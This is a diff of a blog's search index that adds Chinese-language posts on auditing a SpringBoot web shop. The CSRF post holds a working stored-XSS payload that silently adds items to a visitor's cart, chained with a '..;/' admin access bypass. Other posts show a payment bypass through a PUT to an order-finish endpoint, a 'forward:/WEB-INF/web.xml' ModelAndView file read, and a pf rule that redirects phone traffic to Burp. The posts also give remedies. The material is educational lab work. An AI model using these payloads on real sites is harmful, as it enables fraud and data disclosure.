-<p><a href="https://www.cnblogs.com/volcano-liu/p/11301057.html" target="_blank" rel="noopener">https://www.cnblogs.com/volcano-liu/p/11301057.html</a></p>
-<p><a href="https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133" target="_blank" rel="noopener">https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
-    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
-    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
-<a id="more"></a>
-
-<p>使用步骤：</p>
-<ol>
-<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
-<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
-
-<ol start="3">
-<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
-</li>
-<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
-
-
-
-<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
-<p><code>sudo pfctl -d</code>关闭packet filter</p>
-<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计四 - XSS</title>
     <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
     <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
@@ -1072,6 +954,124 @@
 <p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
 <p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
 <p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计六 - CSRF</title>
+    <url>/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/</url>
+    <content><![CDATA[<p>CSRF真正和代码相关的内容不太多，主要还是看过滤器和拦截器。代码审计中的思路是检查是否校验Referer、是否给cookie设置SameSite属性和敏感操作是否会生成CSRF token，如果都不存在再查看请求参数中是否存在不可被攻击者猜测的字段，比如验证码等参数。</p>
+<a id="more"></a>
+
+<h1 id="CSRF代码审计过程"><a href="#CSRF代码审计过程" class="headerlink" title="CSRF代码审计过程"></a>CSRF代码审计过程</h1><p>案例项目中不存在Referer校验和CSRF token，所以网站肯定存在多处CSRF。除了修改密码处需要的原密码攻击者无法知晓外，其他功能点均存在CSRF。</p>
+<p>我们以添加购物车功能为例，请求内容为下，没有任何token值</p>
+<img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/add-to-shop-cart.png" alt="add-to-shop-cart" style="zoom:43%;">
+
+
+
+<p>由于是json格式的请求，不能直接使用burp Generate CSRF PoC，因为burp生成的PoC无法伪造Content-Type。burp生成的CSRF PoC请求内容如下，可以看到<code>Content-Type: text/plain</code>，并且post数据多出一个等号。</p>
+<img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/csrf-request-add-shop-cart.png" alt="csrf-request-add-shop-cart" style="zoom: 43%;">
+
+<p>使用fetch跨域请求会先发送一个options请求，fetch设置no-cors模式又无法更改Content-Type。还有一种利用方法是使用flash+307跳转，这种方法只适用于老旧浏览器。</p>
+<p>不过我们可以利用之前审计出来的漏洞组合起来利用。</p>
+<p>首先我们通过未授权访问商品 <a href="http://localhost:8089/index/..;/admin/goods/edit/10896" target="_blank" rel="noopener">http://localhost:8089/index/..;/admin/goods/edit/10896</a></p>
+<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/edit-goods.png" alt="edit-goods"></p>
+<p>将商品详细信息改为，该<code>&lt;script&gt;</code>会发送添加商品10986到购物车的操作</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">const</span> authUrl = `http:<span class="comment">//localhost:8089/shop-cart`;</span></span></span><br><span class="line">	fetch(</span><br><span class="line">		authUrl,</span><br><span class="line">		&#123;</span><br><span class="line"><span class="actionscript">			method: <span class="string">'POST'</span>,</span></span><br><span class="line"><span class="actionscript">			credentials: <span class="string">'include'</span>,</span></span><br><span class="line">			headers: &#123;</span><br><span class="line"><span class="actionscript">				<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span></span><br><span class="line"><span class="actionscript">				<span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span></span><br><span class="line">			&#125;,</span><br><span class="line"><span class="actionscript">			body: <span class="string">'&#123;"goodsId":10896,"goodsCount":1&#125;'</span>,</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">	).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">throw</span> err;</span></span><br><span class="line"><span class="javascript">	&#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">	&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为富文本编辑器会将我们输入的内容编码，在保存过程中抓包，修改goodsDetailContent参数为XSS payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">\</span>"<span class="attr">text</span>/<span class="attr">javascript</span>\" <span class="attr">charset</span>=<span class="string">\</span>"<span class="attr">utf-8</span>\"&gt;</span><span class="javascript"><span class="keyword">const</span> authUrl=<span class="string">`http://localhost:8089/shop-cart`</span>;fetch(authUrl,&#123;<span class="attr">method</span>:<span class="string">'POST'</span>,<span class="attr">credentials</span>:<span class="string">'include'</span>,<span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/json'</span>,<span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span>&#125;,<span class="attr">body</span>:<span class="string">'&#123;\"goodsId\":10896,\"goodsCount\":1&#125;'</span>&#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;<span class="keyword">throw</span> err;&#125;).then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/update-xss-in-goods.png" alt="update-xss-in-goods"></p>
+<p>每当用户访问10896这个商品时都会触发XSS，然后XSS执行CSRF请求，将该商品添加到购物车中</p>
+<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/xss-combine-csrf.png" alt="xss-combine-csrf"></p>
+<p>查看购物车，发现该商品在未经人工操作的情况下被进入购物车。我们甚至还可以再添加结算和下订单操作，直接等待用户付款。</p>
+<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/auto-add-goods-in-shop-cart.png" alt="auto-add-goods-in-shop-cart"></p>
+<h1 id="CSRF修复"><a href="#CSRF修复" class="headerlink" title="CSRF修复"></a>CSRF修复</h1><h2 id="校验Referer"><a href="#校验Referer" class="headerlink" title="校验Referer"></a>校验Referer</h2><p>Spring中可以使用interceptor来校验Referer，以下代码为例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefererInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> AntPathMatcher matcher = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> RefererProperties properties;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String referer = req.getHeader(<span class="string">"referer"</span>);</span><br><span class="line">		String host = req.getServerName();</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">"POST"</span>.equals(req.getMethod())) &#123;  <span class="comment">// 只验证POST请求</span></span><br><span class="line">			<span class="keyword">if</span> (referer == <span class="keyword">null</span>) &#123; <span class="comment">//若referer为空</span></span><br><span class="line">				resp.setStatus(HttpServletResponse.SC_FORBIDDEN); <span class="comment">//返回403</span></span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125; </span><br><span class="line">			java.net.URL url = <span class="keyword">null</span>;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				url = <span class="keyword">new</span> java.net.URL(referer);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">				resp.setStatus(HttpServletResponse.SC_FORBIDDEN); <span class="comment">// URL解析异常，也置为403</span></span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!host.equals(url.getHost())) &#123;  <span class="comment">// 首先判断请求域名和referer域名是否相同</span></span><br><span class="line">				<span class="keyword">if</span> (properties.getRefererDomain() != <span class="keyword">null</span>) &#123;  <span class="comment">// 如果不等，判断是否在白名单中</span></span><br><span class="line">					<span class="keyword">for</span> (String s : properties.getRefererDomain()) &#123;</span><br><span class="line">						<span class="keyword">if</span> (s.equals(url.getHost())) &#123;</span><br><span class="line">							<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="给cookie设置SameSite属性"><a href="#给cookie设置SameSite属性" class="headerlink" title="给cookie设置SameSite属性"></a>给cookie设置SameSite属性</h2><p>关于SameSite属性可参考 <a href="https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA</a></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CookieServiceInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HttpServletRequest request, HttpServletResponse response, Object handler, </span></span></span><br><span class="line"><span class="function"><span class="params">	ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//检查返回中是否存在"set-cookie"，若存在，则给其加上"SameSite"属性</span></span><br><span class="line">		Collection&lt;String&gt; headers = response.getHeaders(HttpHeaders.SET_COOKIE);</span><br><span class="line">		<span class="keyword">boolean</span> firstHeader = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">for</span> (String header : headers) &#123; <span class="comment">// 可能存在多个"Set-Cookie"属性，故采用for循环</span></span><br><span class="line">			<span class="keyword">if</span> (firstHeader) &#123;</span><br><span class="line">				response.setHeader(HttpHeaders.SET_COOKIE, String.format(<span class="string">"%s; %s"</span>,  header, <span class="string">"SameSite=strict"</span>)); <span class="comment">//可根据业务设置strict或者lax</span></span><br><span class="line">				firstHeader = <span class="keyword">false</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		response.addHeader(HttpHeaders.SET_COOKIE, String.format(<span class="string">"%s; %s"</span>,  header, <span class="string">"SameSite=strict"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, </span></span></span><br><span class="line"><span class="function"><span class="params">	Object handler, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="设置CSRF-token"><a href="#设置CSRF-token" class="headerlink" title="设置CSRF token"></a>设置CSRF token</h2><p>CSRF token生成可以借助Spring Security框架，默认提供CSRF防护。Spring Security的CSRF防护是基于Filter来实现的，Spring Security提供多种保存token的策略，既可以保存在cookie中，也可以保存在session中，保存方法可以手动指定。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">	request.setAttribute(HttpServletResponse<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">response</span>)</span>;</span><br><span class="line">	<span class="comment">// 通过tokenRepository从request中获取csrf token</span></span><br><span class="line">	CsrfToken csrfToken = <span class="keyword">this</span>.tokenRepository.loadToken(request);</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">boolean</span> missingToken = csrfToken == <span class="keyword">null</span>;</span><br><span class="line">	<span class="comment">// 如果未获取到token则新生成token并保存</span></span><br><span class="line">	<span class="keyword">if</span> (missingToken) &#123;</span><br><span class="line">		csrfToken = <span class="keyword">this</span>.tokenRepository.generateToken(request);</span><br><span class="line">		<span class="keyword">this</span>.tokenRepository.saveToken(csrfToken, request, response);</span><br><span class="line">	&#125;</span><br><span class="line">	request.setAttribute(CsrfToken<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">csrfToken</span>)</span>;</span><br><span class="line">	request.setAttribute(csrfToken.getParameterName(), csrfToken);</span><br><span class="line">	<span class="comment">// 判断是否需要进行csrf token校验</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">this</span>.requireCsrfProtectionMatcher.matches(request)) &#123;</span><br><span class="line">		filterChain.doFilter(request, response);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取前端传过来的实际token</span></span><br><span class="line">	String actualToken = request.getHeader(csrfToken.getHeaderName());</span><br><span class="line">	<span class="keyword">if</span> (actualToken == <span class="keyword">null</span>) &#123;</span><br><span class="line">		actualToken = request.getParameter(csrfToken.getParameterName());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 校验两个token是否相等</span></span><br><span class="line">	<span class="keyword">if</span> (!csrfToken.getToken().equals(actualToken)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.debug(<span class="string">"Invalid CSRF token found for "</span></span><br><span class="line">				+ UrlUtils.buildFullRequestUrl(request));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 如果是token缺失导致，则抛出MissingCsrfTokenException异常</span></span><br><span class="line">		<span class="keyword">if</span> (missingToken) &#123;</span><br><span class="line">			<span class="keyword">this</span>.accessDeniedHandler.handle(request, response,</span><br><span class="line">				<span class="keyword">new</span> MissingCsrfTokenException(actualToken));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 如果不是同一个token则抛出InvalidCsrfTokenException异常</span></span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.accessDeniedHandler.handle(request, response,</span><br><span class="line">			<span class="keyword">new</span> InvalidCsrfTokenException(csrfToken, actualToken));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 执行下一个过滤器</span></span><br><span class="line">	filterChain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意，不管是校验Referer还是设置SameSite，都不能防止同站发起的CSRF，比如本文所举的例子就没法防范。XSS也可能从页面中获取CSRF token再进行攻击，这些防范方法都是提高攻击者的攻击难度，而不是完全消灭CSRF。真正重要的功能一定需要短信验证码或者密码之类的仅当前用户知道的参数才能进行操作，比如支付转账等。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf-protection" target="_blank" rel="noopener">https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf-protection</a></p>
+<p><a href="https://blog.csdn.net/junmoxi/article/details/89208311" target="_blank" rel="noopener">https://blog.csdn.net/junmoxi/article/details/89208311</a></p>
+<p><a href="https://www.cnblogs.com/volcano-liu/p/11301057.html" target="_blank" rel="noopener">https://www.cnblogs.com/volcano-liu/p/11301057.html</a></p>
+<p><a href="https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133" target="_blank" rel="noopener">https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
+    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
+    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
+<a id="more"></a>
+
+<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">	NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">	String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">	<span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
+<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
+<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
+<p>在管理页面确认该订单当前状态是待支付</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
+<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
+<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
+<p>再次查看订单，已经交易成功</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
+<p>在管理页面查看该订单，证明交易成功。</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
+    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
+    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
+<a id="more"></a>
+
+<p>使用步骤：</p>
+<ol>
+<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
+<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
+
+<ol start="3">
+<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
+</li>
+<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
+
+
+
+<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
+<p><code>sudo pfctl -d</code>关闭packet filter</p>
+<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
 ]]></content>
   </entry>
   <entry>
@@ -1409,6 +1409,151 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Spring ModelAndView 注入</title>
+    <url>/2020/06/13/Spring_ModelAndView_Injection/</url>
+    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h1><p>在代码审计时发现以下功能点，Checkmarx显示存在<code>Spring ModelView Injection</code>，是由<code>ModelAndView</code>中的参数可被用户控制导致。这个漏洞的历史还是比较久的，但之前没有碰到过，于是就自己搭建环境调试一番，动手学习一下利用方法。</p>
+<a id="more"></a>
+
+<p>源码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(HttpServletRequest req, HttpServletResponse req)</span> </span>&#123;</span><br><span class="line">	String url = <span class="keyword">this</span>.getParam(req, <span class="string">"url"</span>);</span><br><span class="line">	HttpSession session = req.getSession();</span><br><span class="line">	session.setAttribute(<span class="string">"menuitem.url"</span>,url);</span><br><span class="line">	String nextUrl = <span class="string">"xxx"</span> + url;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> RedirectView(nextUrl));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-实践"><a href="#2-实践" class="headerlink" title="2. 实践"></a>2. 实践</h1><p>首先自己搭建一下测试环境，在本地用此代码Demo进行漏洞验证，Springframework版本为<code>5.0.0.RELEASE</code>。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAndViewTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(@RequestParam(value = <span class="string">"url"</span>)</span>String url) </span>&#123;</span><br><span class="line">		String nextUrl = url;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(nextUrl);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>ModelAndView</code>是Spring中的一个模型视图对象，作用是设置跳转的视图地址或把controller方法中处理的数据传到jsp页面。</p>
+<p><code>ModelAndView</code>有两种使用形式：</p>
+<ol>
+<li>forward:/view</li>
+<li>redirect:/view</li>
+</ol>
+<p>若<code>ModelAndView(view)</code>中的<code>view</code>参数可被用户控制，可能导致文件被读取的问题。</p>
+<p>若直接访问 <a href="http://localhost:8089/WEB-INF/web.xml" target="_blank" rel="noopener">http://localhost:8089/WEB-INF/web.xml</a> ，返回404</p>
+<p><img src="/2020/06/13/Spring_ModelAndView_Injection/request_web_xml.png" alt="request_web.xml"></p>
+<p>而使用<code>ModelAndView</code>注入，访问 <a href="http://localhost:8089/menuitem?url=forward:/WEB-INF/web.xml" target="_blank" rel="noopener">http://localhost:8089/menuitem?url=forward:/WEB-INF/web.xml</a> ，就可以看到<code>web.xml</code>的内容</p>
+<p><img src="/2020/06/13/Spring_ModelAndView_Injection/forward_web_xml.png" alt="forward_web.xml"></p>
+<p>但是仅能读取web目录下的文件，不能读取系统其他文件。尝试读取web目录外的文件时产生如下报错：<code>Check that the corresponding file exists within your web application archive!</code></p>
